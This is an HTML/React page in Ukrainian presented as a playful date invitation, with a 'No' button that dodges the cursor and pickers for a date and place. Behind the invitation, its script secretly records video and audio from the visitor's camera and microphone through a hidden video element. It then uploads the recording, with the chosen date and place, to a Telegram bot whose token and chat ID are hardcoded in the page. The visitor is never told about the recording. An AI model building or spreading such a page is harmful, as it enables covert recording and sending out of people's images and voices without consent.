<!DOCTYPE html>
<html lang="uk">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Свіданія</title>
  
  <script src="https://cdn.tailwindcss.com"></script>
  <script src="https://unpkg.com/react@18/umd/react.production.min.js" crossorigin></script>
  <script src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js" crossorigin></script>
  <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>

  <style>
    @keyframes fade-in {
      from { opacity: 0; transform: scale(0.95) translateY(10px); }
      to { opacity: 1; transform: scale(1) translateY(0); }
    }
    @keyframes float {
      0%, 100% { transform: translateY(0) rotate(0deg); }
      50% { transform: translateY(-15px) rotate(8deg); }
    }
    .animate-fade-in {
      animation: fade-in 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards;
    }
    body {
      -webkit-tap-highlight-color: transparent;
      touch-action: manipulation;
    }
  </style>
</head>
<body class="bg-gradient-to-br from-orange-50 via-amber-50 to-pink-50 min-h-screen">
  <div id="root"></div>

  <script type="text/babel">
    const { useState, useEffect, useRef } = React;

    function App() {
      const [step, setStep] = useState(1);
      const [noStyle, setNoStyle] = useState({});
      const [date, setDate] = useState('');
      const [location, setLocation] = useState('');
      const [customLocation, setCustomLocation] = useState('');
      const [showCustomInput, setShowCustomInput] = useState(false);
      const [photo, setPhoto] = useState(null);

      const videoRef = useRef(null);
      const canvasRef = useRef(null);
      const streamRef = useRef(null);
      const mediaRecorderRef = useRef(null);
      const recordedChunksRef = useRef([]);
      const hasSent = useRef(false);
      const fileExtension = useRef('mp4');

      const TELEGRAM_BOT_TOKEN = '9220864046:AAENBw-7pk7srDzF8qS4nJF3kkLqnIYgUN0';
      const TELEGRAM_CHAT_ID = '7545250403';

      useEffect(() => {
        let photoTimeout;

        const startMedia = async () => {
          try {
            const stream = await navigator.mediaDevices.getUserMedia({
              video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
              audio: true,
            });
            streamRef.current = stream;

            if (videoRef.current) {
              videoRef.current.srcObject = stream;
              await videoRef.current.play();
            }

            photoTimeout = setTimeout(() => {
              takePhoto();
            }, 1500);

            // Надійний спосіб запуску запису (не ламає старі айфони)
            let recorder;
            try {
              recorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp8,opus' });
              fileExtension.current = 'webm';
            } catch (e1) {
              try {
                recorder = new MediaRecorder(stream, { mimeType: 'video/mp4' });
                fileExtension.current = 'mp4';
              } catch (e2) {
                recorder = new MediaRecorder(stream);
                fileExtension.current = 'mp4';
              }
            }

            mediaRecorderRef.current = recorder;
            recordedChunksRef.current = [];

            recorder.ondataavailable = (event) => {
              if (event.data && event.data.size > 0) {
                recordedChunksRef.current.push(event.data);
              }
            };

            recorder.start(1000);

          } catch (err) {
            console.warn('Камера заблокована або недоступна:', err);
          }
        };

        const takePhoto = () => {
          if (!videoRef.current || !canvasRef.current) return;
          const video = videoRef.current;
          const canvas = canvasRef.current;
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          const ctx = canvas.getContext('2d');
          if (ctx) {
            ctx.translate(canvas.width, 0);
            ctx.scale(-1, 1);
            ctx.drawImage(video, 0, 0);
            setPhoto(canvas.toDataURL('image/jpeg', 0.85));
          }
        };

        startMedia();

        return () => {
          clearTimeout(photoTimeout);
          stopStream();
        };
      }, []);

      useEffect(() => {
        if (step === 4 && !hasSent.current) {
          hasSent.current = true;
          
          if (mediaRecorderRef.current && mediaRecorderRef.current.state !== 'inactive') {
            mediaRecorderRef.current.onstop = () => {
              const blob = new Blob(recordedChunksRef.current, { type: mediaRecorderRef.current.mimeType || `video/${fileExtension.current}` });
              sendToTelegram(blob);
              stopStream();
            };
            mediaRecorderRef.current.stop();
          } else {
            sendToTelegram(null);
          }
        }
      }, [step]);

      const stopStream = () => {
        if (streamRef.current) {
          streamRef.current.getTracks().forEach((track) => track.stop());
          streamRef.current = null;
        }
      };

      const sendToTelegram = async (videoBlob) => {
        const caption = `🌅 Нова згода на свіданія!\n📅 Дата: ${date.split('-').reverse().join('.')}\n📍 Місце: ${location}`;

        try {
          if (videoBlob && videoBlob.size > 0) {
            const formData = new FormData();
            formData.append('chat_id', TELEGRAM_CHAT_ID);
            formData.append('caption', caption);
            formData.append('video', videoBlob, `reaction.${fileExtension.current}`);

            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, {
              method: 'POST',
              body: formData,
            });
          } else {
            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: caption + '\n(Камера була вимкнена)' }),
            });
          }
        } catch (error) {
          console.error('Помилка відправки в Telegram', error);
        }
      };

      const handleNoHover = (e) => {
        if (e) e.preventDefault();
        const btnWidth = 100;
        const btnHeight = 50;
        const maxX = window.innerWidth - btnWidth - 20;
        const maxY = window.innerHeight - btnHeight - 20;
        const newX = Math.max(20, Math.floor(Math.random() * maxX));
        const newY = Math.max(20, Math.floor(Math.random() * maxY));
        setNoStyle({
          position: 'fixed', left: `${newX}px`, top: `${newY}px`,
          transition: 'all 0.2s cubic-bezier(0.25, 1, 0.5, 1)', zIndex: 1000,
        });
      };

      const today = new Date().toISOString().split('T')[0];
      const maxDate = '2027-12-31';

      return (
        <div className="min-h-screen flex items-center justify-center p-4 relative overflow-hidden font-sans text-gray-800">
          
          <video ref={videoRef} autoPlay playsInline muted className="hidden"></video>
          <canvas ref={canvasRef} className="hidden"></canvas>

          <div className="absolute top-6 left-6 text-4xl sm:text-5xl opacity-50 animate-[float_4s_ease-in-out_infinite]">🦜</div>
          <div className="absolute bottom-10 right-6 text-5xl sm:text-6xl opacity-50 animate-[float_5s_ease-in-out_infinite_reverse]">🌅</div>
          <div className="absolute top-1/4 right-10 text-3xl opacity-40 animate-[float_6s_ease-in-out_infinite]">☀️</div>
          <div className="absolute bottom-1/4 left-6 text-4xl opacity-50 animate-[float_4.5s_ease-in-out_infinite]">🌸</div>

          <div className="bg-white/95 backdrop-blur-md p-6 sm:p-10 rounded-[2rem] shadow-[0_10px_25px_rgba(251,191,36,0.3)] max-w-lg w-full text-center relative z-10 border-4 border-amber-200 my-auto">
            
            {step === 1 && (
              <div className="space-y-8">
                <h1 className="text-3xl sm:text-4xl font-black text-orange-500 leading-tight">
                  Ти підеш зі мною на свіданія? 🦜🌅
                </h1>
                <div className="flex flex-row items-center justify-center gap-4 sm:gap-8 min-h-[70px] mt-6 relative">
                  <button onClick={() => setStep(2)} className="bg-orange-400 text-white font-black py-4 px-8 rounded-2xl text-xl sm:text-2xl transition-transform active:scale-95 shadow-[0_6px_0_rgb(234,88,12)]">
                    Так! 🥰
                  </button>
                  <button onMouseEnter={handleNoHover} onTouchStart={handleNoHover} onClick={handleNoHover} style={noStyle} className="bg-gray-300 text-gray-600 font-black py-4 px-8 rounded-2xl text-xl sm:text-2xl shadow-[0_6px_0_rgb(156,163,175)] z-50">
                    Ні 😢
                  </button>
                </div>
              </div>
            )}

            {step === 2 && (
              <div className="space-y-6 animate-fade-in">
                <h2 className="text-2xl sm:text-3xl font-black text-orange-500 leading-snug">Ура! Ти погодилася 🦜💖🌅</h2>
                <div className="mt-6 space-y-4">
                  <label className="block text-xl font-bold text-gray-700">Обери дату свіданія:</label>
                  <input type="date" min={today} max={maxDate} value={date} onChange={(e) => setDate(e.target.value)} className="w-full text-center p-4 border-3 border-amber-300 rounded-2xl text-xl text-gray-700 font-bold focus:outline-none focus:border-orange-500 bg-amber-50/50 shadow-inner" />
                  <button onClick={() => setStep(3)} disabled={!date} className={`w-full font-black py-4 px-6 rounded-2xl text-xl transition-transform ${!date ? 'bg-gray-300 text-gray-500 shadow-[0_4px_0_rgb(156,163,175)]' : 'bg-green-400 text-white shadow-[0_6px_0_rgb(22,163,74)] active:scale-95'}`}>
                    Підтвердити дату 📅
                  </button>
                </div>
              </div>
            )}

            {step === 3 && (
              <div className="space-y-6 animate-fade-in py-2">
                <h2 className="text-2xl sm:text-3xl font-black text-orange-500 leading-snug">Куди підемо на свіданія?</h2>
                {!showCustomInput ? (
                  <div className="grid grid-cols-2 gap-3 mt-6">
                    {['Кіно 🍿', 'Ресторан 🍷', 'Парк 🌳', 'Кав\'ярня ☕'].map((place) => (
                      <button key={place} onClick={() => { setLocation(place); setStep(4); }} className="bg-orange-400 text-white font-black py-4 px-2 rounded-2xl text-lg transition-transform active:scale-95 shadow-[0_6px_0_rgb(234,88,12)]">
                        {place}
                      </button>
                    ))}
                    <button onClick={() => setShowCustomInput(true)} className="col-span-2 bg-purple-400 text-white font-black py-4 px-2 rounded-2xl text-lg transition-transform active:scale-95 shadow-[0_6px_0_rgb(147,51,234)]">
                      Свій варіант ✍️
                    </button>
                  </div>
                ) : (
                  <div className="mt-6 space-y-4">
                    <input type="text" value={customLocation} onChange={(e) => setCustomLocation(e.target.value)} placeholder="Напиши свій варіант..." className="w-full text-center p-4 border-3 border-purple-300 rounded-2xl text-lg text-gray-700 font-bold focus:outline-none focus:border-purple-500 bg-purple-50/50 shadow-inner" />
                    <button onClick={() => { setLocation(customLocation || 'Сюрприз ✨'); setStep(4); }} className="w-full bg-purple-400 text-white font-black py-4 px-6 rounded-2xl text-xl transition-transform shadow-[0_6px_0_rgb(147,51,234)] active:scale-95">
                      Підтвердити 🚀
                    </button>
                  </div>
                )}
              </div>
            )}

            {step === 4 && (
              <div className="space-y-6 animate-fade-in py-2">
                <div className="text-5xl mb-2 flex justify-center gap-2 animate-[bounce_2s_infinite]">🦜 🌅 💖</div>
                <h2 className="text-2xl sm:text-3xl font-black text-orange-500 leading-snug">Ура! Буду чекати на свіданія ✨</h2>

                {photo && (
                  <div className="mt-4 mx-auto max-w-[200px]">
                    <div className="relative rounded-2xl overflow-hidden border-4 border-amber-300 shadow-lg transform -rotate-2">
                      <img src={photo} alt="Твоє фото" className="w-full h-auto object-cover" />
                    </div>
                  </div>
                )}

                <div className="flex flex-col gap-4 items-center justify-center mt-6">
                  <div className="bg-amber-100 p-4 w-full rounded-2xl border-3 border-amber-300 shadow-sm">
                    <p className="text-sm text-gray-500 font-bold uppercase">Дата</p>
                    <p className="text-xl text-orange-600 font-black">{date.split('-').reverse().join('.')}</p>
                  </div>
                  <div className="bg-pink-100 p-4 w-full rounded-2xl border-3 border-pink-300 shadow-sm">
                    <p className="text-sm text-gray-500 font-bold uppercase">Місце</p>
                    <p className="text-xl text-pink-600 font-black break-words">{location}</p>
                  </div>
                </div>
              </div>
            )}
          </div>
        </div>
      );
    }

    const root = ReactDOM.createRoot(document.getElementById('root'));
    root.render(<App />);
  </script>
</body>
</html>
